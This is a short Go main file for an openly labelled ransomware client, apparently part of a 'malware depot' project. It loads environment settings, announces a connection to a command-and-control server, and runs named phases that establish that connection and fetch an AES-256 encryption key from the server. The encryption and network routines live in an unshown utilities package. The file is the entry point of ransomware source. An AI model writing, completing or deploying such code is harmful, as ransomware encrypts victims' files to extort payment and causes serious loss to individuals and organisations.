package main

import (
	"fmt"
	"log"
	"ransomware_client/utilities"

	"github.com/joho/godotenv"
)

func main() {
	// Load .env file
	err := godotenv.Load()
	if err != nil {
		log.Panicf("Error loading .env file: %v", err.Error())
	}

	fmt.Println("Connected to the C&C Server")

	// (Phase 1) Establishing connection to the server
	utilities.ExecuteRansomwarePhase("KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:ESTABLISHCONNECTION")

	// (Phase 2) Get the encryption key from the server
	encryptionKeyAES256 := make([]byte, 32)
	copy(encryptionKeyAES256, utilities.ExecuteRansomwarePhase("KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:GETENCRYPTIONKEY"))
	if len(encryptionKeyAES256) != 32 {
		log.Panicf("Error: Invalid encryption key received from the server, length: %d", len(encryptionKeyAES256))
	} else {
		fmt.Printf("Encryption key received from the server: 0x%x...\n", encryptionKeyAES256[:16])
	}
}
